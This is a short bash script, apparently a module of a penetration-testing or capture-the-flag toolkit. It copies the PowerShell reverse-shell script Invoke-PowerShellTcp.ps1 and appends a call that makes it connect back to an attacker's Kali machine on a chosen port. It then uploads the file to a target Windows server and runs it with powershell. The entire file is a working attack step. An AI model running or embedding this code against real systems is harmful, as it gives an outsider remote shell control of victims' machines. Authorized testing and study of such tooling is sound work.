#!/bin/bash

: '
cmd: download Invoke-PowerShellTcp.ps1 to server and start shell
'

LOCATION="${SCRIPTS_DIR}/shell/windows/.files"
FILE="Invoke-PowerShellTcp-shell.ps1"

SRC_FILE="${FILES_FOLDER}/Invoke-PowerShellTcp.ps1"
TMP_FILE="${FILES_FOLDER}/Invoke-PowerShellTcp-shell.ps1"

cp $SRC_FILE $TMP_FILE
echo "Invoke-PowerShellTcp -Reverse -IPAddress ${KALI_IP} -Port ${SHELL_PORT}" >> $TMP_FILE

cmd_upload_file "${LOCATION}" "${FILE}"

execute_command "powershell -c '${FILE_LOCATION}'"
create_new_line
